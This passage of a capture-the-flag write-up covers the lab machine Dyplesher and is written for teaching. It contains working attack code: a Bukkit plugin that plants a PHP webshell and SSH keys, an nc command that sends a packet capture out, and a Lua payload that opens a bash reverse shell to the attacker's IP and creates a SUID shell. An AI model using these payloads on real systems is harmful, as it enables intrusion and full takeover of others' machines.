In the new window, `pom.xml` is open. I’ll add the dependencies from the [walkthrough post](https://www.spigotmc.org/wiki/creating-a-plugin-with-maven-using-intellij-idea/), and then click on the little `m` that shows up at the top right:

[![image-20200530143736774](https://0xdfimages.gitlab.io/img/image-20200530143736774.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200530143736774.png)

Now on the left side, I’ll go to src -> main -> java, and right click, and select New -> Package. I’ll name after the inverted domain plus plug-in name, so `htb.dyplesher.dfplug`. Now I’ll right click on the package, and New -> Java Class. I’ll name it `dfplug`.

![image-20200530144549996](https://0xdfimages.gitlab.io/img/image-20200530144549996.png)

This is where I’ll put Java. Opening it in the editor, I’ll have the main class extend `JavaPlugin`, and basically put the code from the blog in.

```

package htb.dyplesher.dfplug;

import org.bukkit.plugin.java.JavaPlugin;

public class dfplug extends JavaPlugin {
    @Override
    public void onEnable() {
        getLogger().info("onEnable is called!");
    }
    @Override
    public void onDisable() {
        getLogger().info("onDisable is called!");
    }
}

```

Finally, I’ll create `plugin.yml` by right clicking on Resources on the left, and then New -> File, giving it that name. In there, I’ll specify the plugin name, version, and path to the main class:

```

name: dfplug
version: 1.0
main: htb.dyplesher.dfplug.dfplug

```

On the right side of the screen, there’s a Maven tab. Clicking that open options, including one under Lifecycle to package:

![image-20200530145456789](https://0xdfimages.gitlab.io/img/image-20200530145456789.png)

Double clicking package will build the package, resulting in a target directory which will have the Jar:

![image-20200530145545697](https://0xdfimages.gitlab.io/img/image-20200530145545697.png)

#### Upload

If I go to Add, hit browse, select my Jar, and then hit the Add button, it reports success:

![image-20200530154600727](https://0xdfimages.gitlab.io/img/image-20200530154600727.png)

No new messages show up in the console.

Now if I go to Reload Plugin, type `dfplug` into the form, and hit Load, it reports success:

![image-20200530154709646](https://0xdfimages.gitlab.io/img/image-20200530154709646.png)

This time there are messages in the console:

![image-20200530154736279](https://0xdfimages.gitlab.io/img/image-20200530154736279.png)

If I unload the plugin, the stuff I logged is printed there as well:

![image-20200531061009516](https://0xdfimages.gitlab.io/img/image-20200531061009516.png)

### Plugin Leak /etc/passwd

Given that I can write to the console, I’ll try leaking `/etc/passwd`. I’ll update the `onEnable` function (and some additional imports not shown, the IDE will yell at you until you add them):

```

@Override
public void onEnable() {
    getLogger().info("onEnable is called!");

    try {
        String strCurrentLine;
        BufferedReader fr = new BufferedReader(new FileReader("/etc/passwd"));
        while ((strCurrentLine = fr.readLine()) != null) {
            getLogger().info(strCurrentLine);
        }
    } catch (IOException e) {
        e.printStackTrace();
    }
}

```

I’ll upload this, and then load the plugin. The contents overflow the number of lines held on the console, but I can see the users who likely have home directories, felamos, MinatoTW, yuntao:

![image-20200531061328912](https://0xdfimages.gitlab.io/img/image-20200531061328912.png)

### Plugin For Shell

Having shown I can read, now I’ll try to write. There’s two attacks that come to mind. I noticed that `test.dyplesher.htb` was using PHP. I can try to guess at locations where that might be on Dyplesher, and write a webshell. I also have three users with their home directory locations, so I can try to write a webshell into each.

I’ll update the plugin code to try to drop both a webshell and an SSH key:

```

    @Override
    public void onEnable() {
        getLogger().info("onEnable is called!");

        String[] paths = {"html", "test", "test.dyplesher.htb"};
        for (String p : paths) {
            String path = "/var/www/" + p + "/0xdf.php";
            try {
                write_webshell(path);
                getLogger().info("Wrote webshell to " + path);
            } catch (IOException e) {
            }
        }

        String[] users = {"felamos", "MinatoTW", "yuntao"};
        for (String user : users) {
            try {
                write_key(user);
                getLogger().info("Wrote key to homedir of " + user);
            } catch (IOException e) {
            }
        }
    }

    public void write_key(String user) throws IOException {
        BufferedWriter bw = new BufferedWriter(new FileWriter("/home/" + user + "/.ssh/authorized_keys", true));
        bw.newLine();
        bw.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDuvHabP2Cb9+Y+psec9TVEpcFufsrx+E+mcpIhFgRyAcoEMU7gmeFxonOcANJ/DCNgv3FJEYMETfdvqW3AU8vJDPFpBkzywCMCVdn8xFAQZBt2FgdVwhTA1F05bjyx+CKh8aw6iuVJhVJ3TtbcEoGsWVXfXS1nWO+uSFIDTZNNUURZRyORJdQ7JH0wwKX42htJkyIeT+Rf+OOFbOcfkfmFbNoOVvk+zm5GZxZgiAyHTeTX8xT5i16Skm4VRCLy4tmDB7Ze80egJxbQHfjRKuFOHitbz2ls6KoYWWCsugbiADjizmYlrIGqlpadenNZhL3W+HVac9CvTuDj6lxLnswpzGVj/D69DGxq0zo9ZIa9iLK9zjkyWHWxVOPuvPAxTSFrcDStPrgws95IzVTlM5ogOp0LZodGsp7hr/+03mrIBf/UIYcPgyO5Mqbo2jvtklo9ZyI2kpu+5D7FFS7YRbvLYOYvpRyGHUfpnUSEtKLRCg0ofcsoKYYPJqzrilFcPK8= root@kali\n");
        bw.newLine();
        bw.close();
    }
    
    public void write_webshell(String path) throws IOException {
        BufferedWriter bw = new BufferedWriter(new FileWriter(path, false));
        bw.write("<?php system($_REQUEST[\"cmd\"]); ?>");
        bw.newLine();
        bw.close();
    }

```

I wrote two helper functions. `write_key` takes a user, and tried to append to their `authorized_keys` file my generated public key. `write_webshell` takes a path, and tries to write a simple PHP webshell at that path. Then, in `onEnable`, I loop over the three users calling `write_key` and three potential locations for `test.dyplesher.htb` calling `write_webshell`.

I’ll package this, and upload it. Then I’ll load the plugin, and check the console:

![image-20200531063619762](https://0xdfimages.gitlab.io/img/image-20200531063619762.png)

Looks like two successful webshell writes, and one successful key write.

### Webshell

If I check `test` I find the webshell working:

```

root@kali# curl http://test.dyplesher.htb/0xdf.php?cmd=id
uid=1001(MinatoTW) gid=1001(MinatoTW) groups=1001(MinatoTW),122(wireshark)

```

I’m running as MinatoTW. It was worth checking the webshell in case it provided access to www-data or another user. But given I have an SSH key already written for this user, I’ll leave the webshell for now.

### SSH

SSH as MinatoTW works:

```

root@kali# ssh -i ~/keys/gen MinatoTW@10.10.10.190
Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-46-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 31 May 2020 10:40:52 AM UTC

  System load:  0.0               Processes:              239
  Usage of /:   6.8% of 97.93GB   Users logged in:        0
  Memory usage: 36%               IP address for ens33:   10.10.10.190
  Swap usage:   0%                IP address for docker0: 172.17.0.1

57 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable

Last login: Wed May 20 13:44:56 2020 from 10.10.14.47
MinatoTW@dyplesher:~$

```

## Priv: MinatoTW –> felamos

### Enumeration

Before running any kind of enumeration script, I’ll check things like check the home directory, `id`, and `sudo -l`, two of which provide the necessary leads to continue.

#### Home Directory

MinatoTW’s homedir has three folders in it:

```

MinatoTW@dyplesher:~$ ls
backup  Cuberite  paper

```

`backup` has four files. `backup.sh` is a Bash script that seems to flush and then repopulate the memcache with the contents of this directory:

```

#!/bin/bash

memcflush --servers 127.0.0.1 --username felamos --password zxcvbnm
memccp --servers 127.0.0.1 --username felamos --password zxcvbnm /home/MinatoTW/backup/*

```

Running `crontab -l` shows that this is being run as MinatoTW every minute:

```

MinatoTW@dyplesher:~/backup$ crontab -l
...[snip]...
# m h  dom mon dow   command
*/1 * * * * bash /home/MinatoTW/backup/backup.sh

```

The other three files contain the same information I earlier leaked from memcache:

```

MinatoTW@dyplesher:~/backup$ cat email 
MinatoTW@dyplesher.htb
felamos@dyplesher.htb
yuntao@dyplesher.htb
MinatoTW@dyplesher:~/backup$ cat password 
$2a$10$5SAkMNF9fPNamlpWr.ikte0rHInGcU54tvazErpuwGPFePuI1DCJa
$2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK
$2a$10$zXNCus.UXtiuJE5e6lsQGefnAH3zipl.FRNySz5C4RjitiwUoalS
MinatoTW@dyplesher:~/backup$ cat username 
MinatoTW
felamos
yuntao

```

`paper` seems to have the same code I pulled from the Gogs `repo.zip` earlier:

```

MinatoTW@dyplesher:~/paper$ ls
banned-ips.json      bukkit.yml  commands.yml  help.yml  ops.json   paper.yml        plugins            spigot.yml  usercache.json        whitelist.json
banned-players.json  cache       eula.txt      logs      paper.jar  permissions.yml  server.properties  start.sh    version_history.json  world

```

[Cuberite](https://cuberite.org/) is a Minecraft game server, and seems to be what’s in `cuberite`:

```

MinatoTW@dyplesher:~/Cuberite$ ls
BACKERS         buildinfo     Cuberite     helgrind.log  itemblacklist  LICENSE   MojangAPI.sqlite          motd.txt  Ranks.sqlite  start.sh  webadmin          world
banlist.sqlite  CONTRIBUTORS  favicon.png  hg            items.ini      Licenses  MojangAPI.sqlite-journal  Plugins   README.txt    vg        webadmin.ini      world_nether
brewing.txt     crafting.txt  furnace.txt  hg.supp       lang           logs      monsters.ini              Prefabs   settings.ini  vg.supp   whitelist.sqlite  world_the_end

```

I did some crawling through the configs looking for passwords, but didn’t find anything useful.

#### Groups

The `id` output is interesting:

```

MinatoTW@dyplesher:~$ id
uid=1001(MinatoTW) gid=1001(MinatoTW) groups=1001(MinatoTW),122(wireshark) 

```

As the creator went to the trouble to add MinatoTW to the `wireshark` group, I should see why. There’s only one file owned by that group, and being in the group allows members to execute it:

```

MinatoTW@dyplesher:/$ find / -group wireshark -ls 2>/dev/null 
  5908757    112 -rwxr-xr--   1 root     wireshark   113112 Sep 26  2019 /usr/bin/dumpcap

```

Since the file is not SUID, there’s no real point in trying to escalate through it (and I don’t know of any methods anyway). It uses [capabilities](/2018/12/15/htb-waldo.html#capabilities) to get the access it needs to capture:

```

MinatoTW@dyplesher:~$ getcap /usr/bin/dumpcap 
/usr/bin/dumpcap = cap_net_admin,cap_net_raw+eip

```

### Network Sniffing

#### Capture

I started a capture, and it instantly started collecting packets:

```

MinatoTW@dyplesher:/$ dumpcap -w /dev/shm/out.pcapng
Capturing on 'docker0'
File: /dev/shm/out.pcapng
Packets: 130

```

I let it run for a while, knowing that a lot of that is my SSH connection. It took me several attempts to leave it running for long enough to capture something interesting, but once I let it run for a few minutes, it had interesting data.

#### Exfil

I tried to use `nc` to send the results back to my Kali box, but it just didn’t connect. I tried to just have `nc` connect (`nc 10.10.14.47 443` on Dyplesher and `nc -lnvp 443` on Kali), and it just hangs and eventually times out. It seems like a firewall is blocking the connection. I set up a loop that would try to connect back on all tcp ports, and started up `tcpdump` on Kali to listen for any successful connections. The loop will run the `nc` processes in parallel, but it still takes a little time to run:

```

MinatoTW@dyplesher:~$ time for i in $(seq 1 65535); do (nc -zvn -w 1 10.10.14.47 $i 2>/dev/null &); done

```

Locally I see only ports two ports, 5672 and 11211, are allowed to initiate connections outbound:

```

root@kali# tcpdump -ni tun0 'src 10.10.10.190 and not port 22'
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
06:51:43.029708 IP 10.10.10.190.39694 > 10.10.14.47.5672: Flags [S], seq 3376141658, win 64240, options [mss 1357,sackOK,TS val 3293403480 ecr 0,nop,wscale 7], length 0                          
06:52:14.182417 IP 10.10.10.190.56874 > 10.10.14.47.11211: Flags [S], seq 97388368, win 64240, options [mss 1357,sackOK,TS val 3293434632 ecr 0,nop,wscale 7], length 0  

```

I’ll grab the first one to send my PCAP back:

```

MinatoTW@dyplesher:~$ cat /dev/shm/out.pcapng | nc 10.10.14.47 5672

```

```

root@kali# nc -lnvp 5672 > capture.pcapng
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::5672
Ncat: Listening on 0.0.0.0:5672
Ncat: Connection from 10.10.10.190.
Ncat: Connection from 10.10.10.190:58396.

```

In hindsight, I could have also just used SCP with the SSH keys I’ve already got in place, but it’s useful to understand the firewall.

#### Analysis

I’ll include my capture [here](/files/dyplesher.pcapng) for anyone who wants to take a look. I’ll open it in Wireshark, and first take a look at TCP streams. I’ll select one of the first TCP packets, right click, and go to Follow -> TCP Stream. The first stream will almost certainly be my SSH connection. Luckily that will all be in one stream, so at least in this view I can ignore it easily.

About once I minute (the first time about 28 seconds into my capture), there are four streams (1-4) showing the memcache activity. This is consistent with the `cron` I enumerated above. I’m not sure why each command takes two streams, but the first two are likely the flush:

![image-20200603070243814](https://0xdfimages.gitlab.io/img/image-20200603070243814.png)

Followed by two that are repopulating the cache:

![image-20200603070312824](https://0xdfimages.gitlab.io/img/image-20200603070312824.png)

Also every minute (first time about 45 seconds into my capture) there is traffic on 4369, the Erlang Port mapper. There are two streams (5-6) related to rabbit:

![image-20200603071053626](https://0xdfimages.gitlab.io/img/image-20200603071053626.png)

![image-20200603071105241](https://0xdfimages.gitlab.io/img/image-20200603071105241.png)

Every two minutes, there’s a single stream (11 in my capture) on TCP 5672. This is the Rabbit messaging queue, and I see it is sending subscribers:

[![image-20200603071412227](https://0xdfimages.gitlab.io/img/image-20200603071412227.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200603071412227.png)

For each user, there is a password field. The last three are users on this box.

### SSH

MinatoTW’s works to SSH into Dyplesher:

```

root@kali# sshpass -p bihys1amFov ssh MinatoTW@10.10.10.190
Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-46-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 03 Jun 2020 11:18:51 AM UTC

  System load:  0.1               Processes:              234
  Usage of /:   6.8% of 97.93GB   Users logged in:        1
  Memory usage: 38%               IP address for ens33:   10.10.10.190
  Swap usage:   0%                IP address for docker0: 172.17.0.1

57 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings

Last login: Wed Jun  3 11:18:38 2020 from 10.10.14.47
MinatoTW@dyplesher:~$

```

Same for yuntao (not much interesting there, not shown).

Both SSH and `su` work with felamos’ password:

```

root@kali# sshpass -p tieb0graQueg ssh felamos@10.10.10.190
Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-46-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 03 Jun 2020 11:20:21 AM UTC

  System load:  0.04              Processes:              240
  Usage of /:   6.8% of 97.93GB   Users logged in:        1
  Memory usage: 38%               IP address for ens33:   10.10.10.190
  Swap usage:   0%                IP address for docker0: 172.17.0.1

57 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings

Last login: Thu Apr 23 17:33:41 2020 from 192.168.0.103
felamos@dyplesher:~$

```

And now I can grab `user.txt`:

```

felamos@dyplesher:~$ cat user.txt
65a60e10************************

```

## Priv: felamos –> root

### Enumeration

In felamos’ home directory, there’s a `yuntao` directory, and in it, a single file, `send.sh`.

```

#!/bin/bash

echo 'Hey yuntao, Please publish all cuberite plugins created by players on plugin_data "Exchange" and "Queue". Just send url to download plugins and our new code will review it and working plugins will be added to the server.' >  /dev/pts/{}

```

This pretty clearly lays out the challenge ahead. I need to create a cuberite plugin that will get me a shell and publish the url for the plugin to the `plugin_data` “Exchange” / “Queue”, which I believe is the RabbitMQ I already noticed running with `nmap`.

### Submit Message to Rabbit

#### Strategy

The first thing I need to do is submit a message to the Rabbit queue. Based on the note above, I should be able to submit a url as the body of the massage, and then it will request that url. So I’ll start a Python webserver on my host (picking one of the ports allowed outbound), and see if I can get Dyplesher to contact it.

#### Tool

I did a bunch of Googling, and eventually settled on [amqp-publish](https://github.com/selency/amqp-publish). It’s a simple tool, only [~70 lines](https://github.com/selency/amqp-publish/blob/master/main.go) of `go` that manages a connection and publishing of a message to an AMQP queue (like Rabbit).

I’ll download the [release](https://github.com/selency/amqp-publish/releases) and drop it in `/usr/local/bin` as `amqp-publish`.

Now I can run it and get the help menu:

```

root@kali# amqp-publish --help
Usage of amqp-publish:
  -body string
        Message body
  -exchange string
        Exchange name
  -routing-key string
        Routing key. Use queue
        name with blank exchange to publish directly to queue.
  -uri string
        AMQP URI amqp://<user>:<password>@<host>:<port>/[vhost]

```

#### Initial Attempts

My first attempt was to submit with the fewest number of arguments and see if it yells at me. I’ll include a url of my machine, making sure to use a port that I know can reach back to me. It did not like that:

```

root@kali# amqp-publish --uri="amqp://10.10.10.190:5672" --body="http://10.10.14.47:11211"
exchange and routing-key cannot both be blank

```

It needs an exchange name and a routing key, which the help message also includes the word “queue”. So I put `plugin_data` for both as hinted at by the message in the Bash script. It works, but now it’s complaining about auth:

```

root@kali# amqp-publish --uri="amqp://10.10.10.190:5672" --body="http://10.10.14.47:11211" --exchange="plugin_data" --routing-key="plugin_data"
Exception (403) Reason: "username or password not allowed"

```

#### Creds

Since there was some kind of publishing going on in the PCAP, I went back there. Right at the top of the exchange, the client checks in, and then it looks like the server asks for a bunch of things. The client replies with those, including the usename and password:

![image-20200603133436260](https://0xdfimages.gitlab.io/img/image-20200603133436260.png)

Username: yuntao

Password: EashAnicOc3Op

#### Request with Creds

I’ll add the creds in, and run now, and it silently returns:

```

root@kali# amqp-publish --uri="amqp://yuntao:EashAnicOc3Op@10.10.10.190:5672" --body="http://10.10.14.47:11211" --exchange="plugin_data" --routing-key="plugin_data"

```

I believe that means it successfully published a message. I don’t see a hit on my webserver. I started to tinker with the `exchange` and the `routing-key`. In the error message above, it said one was required, so I tried just giving one of them. It turns out either on its own works:

```

root@kali# amqp-publish --uri="amqp://yuntao:EashAnicOc3Op@10.10.10.190:5672" --body="http://10.10.14.47:11211" --exchange="plugin_data"

```

Results in:

```

root@kali# python3 -m http.server 11211
Serving HTTP on 0.0.0.0 port 11211 (http://0.0.0.0:11211/) ...
10.10.10.190 - - [03/Jun/2020 18:44:52] "GET / HTTP/1.0" 200 -

```

Similarly:

```

root@kali# amqp-publish --uri="amqp://yuntao:EashAnicOc3Op@10.10.10.190:5672" --body="http://10.10.14.47:11211" --routing-key="plugin_data"

```

Also makes a hit:

```
10.10.10.190 - - [03/Jun/2020 18:45:50] "GET / HTTP/1.0" 200 -

```

### Write Malicious Plugin

#### Strategy

There’s a [post on the cuberite site](https://api.cuberite.org/Writing-a-Cuberite-plugin.html) that describes how to make a plugin. Cuberite plugins are written in Lua. They have some structure, but because the script implies that it will be evaluated by code, I’m going to make a guess that any Lua script might be executed. If that proves wrong, I’ll come back and wrap the structure around it.

#### Hello World Plugin

Lua has an `os.execute()` [function](https://www.lua.org/pil/22.2.html) that I will make use of. To test, I’ll write a simple script that is nothing more than a single line to touch a file in `/tmp`:

```

os.execute("touch /tmp/df")

```

Now I’ll upload it:

```

root@kali# amqp-publish --uri="amqp://yuntao:EashAnicOc3Op@10.10.10.190:5672" --body="http://10.10.14.47:11211/touch.lua" --routing-key="plugin_data"

```

It’s requested from the webserver immediately:

```
10.10.10.190 - - [03/Jun/2020 18:57:10] "GET /touch.lua HTTP/1.0" 200 -

```

About a minute later, there’s a file in `/tmp`, owned by root:

```

felamos@dyplesher:~$ ls -l /tmp/df 
-rw-r--r-- 1 root root 0 Jun  3 23:00 /tmp/df

```

#### Weaponize

Now that I know it works, I’ll look for a way to weaponize it. I’ll try three different things to see if any will work:
1. Write an SSH key to `/root/.ssh/authorized_keys`.
2. Copy `dash` to /tmp and set it as SUID.
3. Create a reverse shell back to my host.

That works out to the following Lua script:

```

os.execute("echo -e '\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDuvHabP2Cb9+Y+psec9TVEpcFufsrx+E+mcpIhFgRyAcoEMU7gmeFxonOcANJ/DCNgv3FJEYMETfdvqW3AU8vJDPFpBkzywCMCVdn8xFAQZBt2FgdVwhTA1F05bjyx+CKh8aw6iuVJhVJ3TtbcEoGsWVXfXS1nWO+uSFIDTZNNUURZRyORJdQ7JH0wwKX42htJkyIeT+Rf+OOFbOcfkfmFbNoOVvk+zm5GZxZgiAyHTeTX8xT5i16Skm4VRCLy4tmDB7Ze80egJxbQHfjRKuFOHitbz2ls6KoYWWCsugbiADjizmYlrIGqlpadenNZhL3W+HVac9CvTuDj6lxLnswpzGVj/D69DGxq0zo9ZIa9iLK9zjkyWHWxVOPuvPAxTSFrcDStPrgws95IzVTlM5ogOp0LZodGsp7hr/+03mrIBf/UIYcPgyO5Mqbo2jvtklo9ZyI2kpu+5D7FFS7YRbvLYOYvpRyGHUfpnUSEtKLRCg0ofcsoKYYPJqzrilFcPK8= root@kali' >> /root/.ssh/authorized_keys")
os.execute("cp /bin/dash /tmp/.0xdf; chmod 4777 /tmp/.0xdf")
os.execute("bash -c 'bash -i >& /dev/tcp/10.10.14.47/5672 0>&1'")

```

I published the url, and it was requested immediately.

### Shell

After the minute rolled over, I checked each of the shells. They all worked.

#### SSH

I was able to SSH using the private key associated with the public one I wrote to `authorized_keys`:

```

root@kali# ssh -i ~/keys/gen root@10.10.10.190 
Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-46-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 03 Jun 2020 06:10:11 PM UTC

  System load:  0.02              Processes:              247
  Usage of /:   6.8% of 97.93GB   Users logged in:        1
  Memory usage: 40%               IP address for ens33:   10.10.10.190
  Swap usage:   0%                IP address for docker0: 172.17.0.1

57 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings

Last login: Wed Jun  3 18:09:14 2020 from 10.10.14.47
root@dyplesher:~#

```

#### SUID dash

The `dash` binary is sitting in `/tmp`:

```

felamos@dyplesher:~$ ls -l /tmp/.0xdf 
-rwsrwxrwx 1 root root 129816 Jun  3 18:10 /tmp/.0xdf

```

I’ll run it with `-p`, and get a shell with effective userid of root:

```

felamos@dyplesher:~$ /tmp/.0xdf -p
# id
uid=1000(felamos) gid=1000(felamos) euid=0(root) groups=1000(felamos)

```

#### Reverse Shell

The easiest way to see that the job had run was when the reverse shell arrived at my `nc` listener:

```

root@kali# nc -lnvp 5672
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::5672
Ncat: Listening on 0.0.0.0:5672
Ncat: Connection from 10.10.10.190.
Ncat: Connection from 10.10.10.190:50606.
bash: cannot set terminal process group (25578): Inappropriate ioctl for device
bash: no job control in this shell
root@dyplesher:~# id
uid=0(root) gid=0(root) groups=0(root)

```

### root.txt

From any of these shells, I can grab `root.txt`:

```

root@dyplesher:~# cat root.txt
5032fab9************************

```

## Beyond Root - Memcache Binary Protocol

### Background

Whenever I’d run into memcache before, I had always dealt with it as a text protocol over `telnet` or `nc`. It turns out that there are actually two protocols that a memcache server will accept, text and binary. And as I mentioned [above](#memcache-with-auth), authentication only works over the binary connection.

The binary protocol is documented [here](https://github.com/memcached/memcached/wiki/BinaryProtocolRevamped#magic-byte). I’ll open up Wireshark and look at what happens when I try to connect.

### Without Creds

When I try to just connect to the server, it throws an error:

```

root@kali# memcached-cli 10.10.10.190:11211
10.10.10.190:11211> MemJS: Server <10.10.10.190:11211> failed after (2) retries with error - undefined

/root/.nvm/versions/node/v14.3.0/lib/node_modules/memcached-cli/index.js:14
  if (err) throw new Error(`Fail to connect to ${server}`)
           ^

Error: Fail to connect to 10.10.10.190:11211
    at /root/.nvm/versions/node/v14.3.0/lib/node_modules/memcached-cli/index.js:14:18
    at /root/.nvm/versions/node/v14.3.0/lib/node_modules/memcached-
 ...[snip]...

```

Looking at the stream in Wireshark, I can see the packet I sent, and “Auth failure” in the message coming back.

![image-20200528130909709](https://0xdfimages.gitlab.io/img/image-20200528130909709.png)

Looking more closely, each packet starts with a 24-byte header. The first word is Magic, where 0x80 means binary request, and 0x81 is binary response. I can see both packets start with the corresponding magic.

The rest of the request breaks down as:

```

   Field        (offset) (value)
   Magic        (0)    : 0x80
   Opcode       (1)    : 0x00
   Key length   (2,3)  : 0x0001
   Extra length (4)    : 0x00
   Data type    (5)    : 0x00
   VBucket      (6,7)  : 0x0000
   Total body   (8-11) : 0x0000000d
   Opaque       (12-15): 0x00000001
   CAS          (16-23): 0x0000000000000000
   Extras              : None
   Key          (24): The textual string: "0"
   Value               : None

```

The response is:

```

   Field        (offset) (value)
   Magic        (0)    : 0x81
   Opcode       (1)    : 0x00
   Key length   (2,3)  : 0x0000
   Extra length (4)    : 0x00
   Data type    (5)    : 0x00
   Status       (6,7)  : 0x0020
   Total body   (8-11) : 0x00000001
   Opaque       (12-15): 0x00000001
   CAS          (16-23): 0x0000000000000000
   Extras              : None
   Key                 : None
   Value        (24-36): The textual string "Auth Failure."

```

### Without Creds on Dab (no auth)

I wanted to compare that to an example where no auth was enabled. [Dab](/2019/02/02/htb-dab.html#memcached---tcp-11211) has an instance of memcache that isn’t using auth. I sshed to the box with a tunnel so I could talk directly to memcache.

Now connecting works:

```

root@kali# memcached-cli 127.0.0.1:11211
127.0.0.1:11211> 

```

In Wireshark, I have the stream:

![image-20200603152502176](https://0xdfimages.gitlab.io/img/image-20200603152502176.png)

The request is very similar to above:

```

   Field        (offset) (value)
   Magic        (0)    : 0x80
   Opcode       (1)    : 0x00 (GET)
   Key length   (2,3)  : 0x0001
   Extra length (4)    : 0x00
   Data type    (5)    : 0x00
   VBucket      (6,7)  : 0x0000
   Total body   (8-11) : 0x00000001
   Opaque       (12-15): 0x00000001
   CAS          (16-23): 0x0000000000000000
   Extras              : None
   Key          (24): The textual string: "0"
   Value               : None

```

The response is different:

```

   Field        (offset) (value)
   Magic        (0)    : 0x81
   Opcode       (1)    : 0x00
   Key length   (2,3)  : 0x0000
   Extra length (4)    : 0x00
   Data type    (5)    : 0x00
   Status       (6,7)  : 0x0001
   Total body   (8-11) : 0x00000009
   Opaque       (12-15): 0x00000001
   CAS          (16-23): 0x0000000000000000
   Extras              : None
   Key                 : None
   Value        (24-36): The textual string "Not found"

```

If I run `get users` (after making sure the cache is refreshed with data), I see the request:

![image-20200603153243312](https://0xdfimages.gitlab.io/img/image-20200603153243312.png)

That is:

```

   Field        (offset) (value)
   Magic        (0)    : 0x80
   Opcode       (1)    : 0x00    (GET)
   Key length   (2,3)  : 0x0005  (len of "users")
   Extra length (4)    : 0x00
   Data type    (5)    : 0x00
   VBucket      (6,7)  : 0x0000
   Total body   (8-11) : 0x00000005
   Opaque       (12-15): 0x00000006
   CAS          (16-23): 0x0000000000000000
   Extras              : None
   Key          (24): The textual string: "users"
   Value               : None

```

The response is:

```

   Field        (offset) (value)
   Magic        (0)    : 0x81
   Opcode       (1)    : 0x00
   Key length   (2,3)  : 0x0000
   Extra length (4)    : 0x04
   Data type    (5)    : 0x00
   Status       (6,7)  : 0x0000
   Total body   (8-11) : 0x00006035
   Opaque       (12-15): 0x00000006
   CAS          (16-23): 0x0000000000000006
   Extras              : None
   Key                 : None
   Value        (24-36): The data as json

```

I could do the same thing with the text protocol here, and just telnet in and run the same query:

```

root@kali# telnet localhost 11211
Trying ::1...
Connected to localhost.
Escape character is '^]'.
get users
VALUE users 0 24625
{"quinton_dach": "17906b445a05dc42f78ae86a92a57bbd", "jackie.abbott": "c6ab361604c4691f78958d6289910d21", "isidro": "e4a4c90483d2ef61de42af1f044087f3", "roy": "afbde995441e19497fe0695e9c539266", "colleen": "d3792794c3143f7e04fd57dc8b085cd4", "harrison.hessel": "bc5f9b43a0336253ff947a4f8dbdb74f", "asa.christiansen": "d7505316e9a10fc113126f808663b5a4", "jessie": "71f08b45555acc5259bcefa3af63f4e1", "milton_hintz": "8f61be2ebfc66a5f2496bbf849c89b84", "demario_homenick": "2c22da161f085a9aba62b9bbedbd4ca7", "paris": "ef9b20082b7c234c91e165c947f10b71", "gardner_ward": "eb7ed0e8c112234ab1439726a4c50162", "daija.casper": "4d0ed472e5714e5cca8ea7272b15173a", "alanna.prohaska": "6980ba8ee392b3fa6a054226b7d8dd8f", "russell_borer": "cb10b94b5dbb5dfab049070a2abda16e", "domenica.kulas": "5cb322691472f05130416b05b22d4cdf", "davon.kuhic": "e301e431db395ab3fdc123ba8be93ff9", "alana": "41c85abbc7c64d93ca7bda5e2cfc46c2", "bryana": "4d0da0f96ecd0e8b655573cd67b8a1c1", "elmo_welch": "89122bf3ade23faf37b470f1fa5c7358", "sasha": "fbabdcc0eb2ace9aa5b88148a02f78fe", "krystina.lynch": "1b4b73070f563b787afaf435943fac9c", "rick_kirlin": "8952b9d5be0dcb77bdf349cc0e79b49d", "elenora": "edbe5879fa4e452ceceedccf59067409", "broderick": "6301675d6d127a550e4da6ccc8e87fed", "valentin": "2cdfa6c94c600f366d3aa9ea3e545b32", "ethel_corwin": "4c5b7aa65cdd97fb653323f55ee78f36", "macy_bernhard": "1325d13589ea46bd0acd5bd0f7936aa4", "jazlyn": "4ce551ded2279ab3a5f62ef12dd64810", "bernadette_o'keefe": "09f7525d1d538ee9466d1ad14ee885eb", "raheem": "a1c8b0d0b531760ff0b2f6e2d5def9c1", "jayce": "da4686a359075849ebf081ab344fc472", "shaniya.rolfson": "3ea81ed35585c8d1cfad5a79cd028b89", "oda": "142fa6a51688da0a1c94a34a7eb49a42", "vergie_kreiger": "331e794ecdd6ece346be81c76382c927", "jennyfer.kuhic": "9cfd6057814977c3e49ab8498e053382", "onie_wisoky": "e7cfdece9109350985fe4c4e9747a88c", "braeden.leffler": "ff4c23d0f7de4b21ab3cfee9532abe23", "chadrick.kohler": "0198cd7c29b52c7c059a40801970a2c5", "elroy": "910973c69c701c0f5c645c1916cb23f7", "ebba": "9b2a0cde8f1aa420de92765b06b9cf04", "shaina_cremin": "3177241008281d3ea30d2b38b99af257", "richmond": "235f1b962f99e02ef82b90f78bf46d4a", "laurence": "61211e0f96b4aa6a5641d1b5fc5749c8", "edmond.willms": 